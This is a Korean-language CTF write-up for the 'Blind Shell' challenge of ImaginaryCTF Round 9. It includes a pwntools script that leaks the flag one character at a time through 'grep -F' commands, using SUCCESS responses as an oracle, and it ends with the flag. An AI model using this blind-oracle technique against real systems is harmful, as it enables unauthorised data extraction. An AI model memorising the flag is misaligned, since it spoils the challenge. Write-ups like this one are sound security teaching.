# [목차]
**1. [Description](#Description)**

**2. [Write-Up](#Write-Up)**

**3. [FLAG](#FLAG)**


***


# **Description**

![](images/2022-05-18-17-17-03.png)

첨부파일

[CABD-blind.py](https://github.com/2jinu/CTFnWargame/blob/main/CTF/ImaginaryCTF%20Round9/Blind%20Shell/file/CABD-blind.py)

# **Write-Up**

cmd의 결과 값이 있을 경우 SUCCESS문자열이 출력된다. 따라서 flag파일을 찾고 grep 명령어를 통해 flag를 획득한다.

```
# man grep
-F, --fixed-strings
              Interpret PATTERN as a list of fixed strings (instead of regular expressions), separated by newlines, any of which is to be matched.
```

다음과 같은 python코드로 flag를 획득할 수 있다.

```py
import string
from pwn import *

p = remote("oreos.ctfchallenge.ga", 12345)

chars = list(string.printable)
flag = "ictf{"
chars.remove('\n')
while True:
    for char in chars:
        p.recvuntil(b'>>> ')
        p.sendline("grep -F \'" + flag + char + "\' flag.txt")
        if(p.recvline() == b'SUCCESS\n'):
            flag += char
            if(char == "}"): print(flag); break
            else: continue
    if(flag[-1] == "}"): break
```


# **FLAG**

**ictf{g01n8_1n_bl!nd?n0t_@_pr0bl3m!}**